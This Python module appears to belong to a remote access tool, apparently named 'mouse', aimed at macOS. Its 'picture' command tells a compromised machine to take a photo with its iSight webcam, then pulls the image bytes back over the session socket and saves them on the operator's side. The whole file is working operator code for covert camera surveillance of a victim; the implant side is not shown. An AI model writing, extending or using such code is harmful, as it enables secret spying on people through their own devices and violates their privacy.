#!/usr/bin/env python3

import json, time, binascii, os
import core.helper as h

class command:
	def __init__(self):
		self.name = "picture"
		self.description = "Take picture through iSight."
		self.usage = "Usage: picture <local_path>"
		self.type = "native"

	def run(self,session,cmd_data):
		if len(cmd_data['args'].split()) < 1:
			print(self.usage)
			return

		w = os.environ['OLDPWD']
		os.chdir(w)
		dest = cmd_data['args'].split()[0]
		if os.path.isdir(dest):
			if os.path.exists(dest):
				h.info_general("Taking picture...")
				response = json.loads(session.send_command(cmd_data))
				try:
					success = response["status"]
					if success == 1:
						size = int(response["size"])
						data = session.sock_receive_data(size)
						f = open(os.path.join(dest,'picture.jpg'),'wb')
						f.write(data)
						f.close()
				except:
					h.info_error("Failed to take picture!")
					return
				if dest[-1] == "/":
					h.info_general("Saving to "+dest+"picture.jpg...")
					time.sleep(1)
					h.info_success("Saved to "+dest+"picture.jpg!")
				else:
					h.info_general("Saving to "+dest+"/picture.jpg...")
					time.sleep(1)
					h.info_success("Saved to "+dest+"/picture.jpg!")
			else:
				h.info_error("Local directory: "+dest+": does not exist!")
		else:
			rp = os.path.split(dest)[0]
			if rp == "":
				rp = "."
			else:
				pass
			if os.path.exists(rp):
				if os.path.isdir(rp):
					pr = os.path.split(dest)[0]
					rp = os.path.split(dest)[1]
					h.info_general("Taking picture...")
					response = json.loads(session.send_command(cmd_data))
					try:
						success = response["status"]
						if success == 1:
							size = int(response["size"])
							data = session.sock_receive_data(size)
							f = open(os.path.join(pr,rp),'wb')
							f.write(data)
							f.close()
					except:
						h.info_error("Failed to take picture!")
						return
					h.info_general("Saving to "+dest+"...")
					time.sleep(1)
					h.info_success("Saved to "+dest+"!")
				else:
					h.info_error("Error: "+rp+": not a directory!")
			else:
				h.info_error("Local directory: "+rp+": does not exist!")
		g = os.environ['HOME']
		os.chdir(g + "/mouse")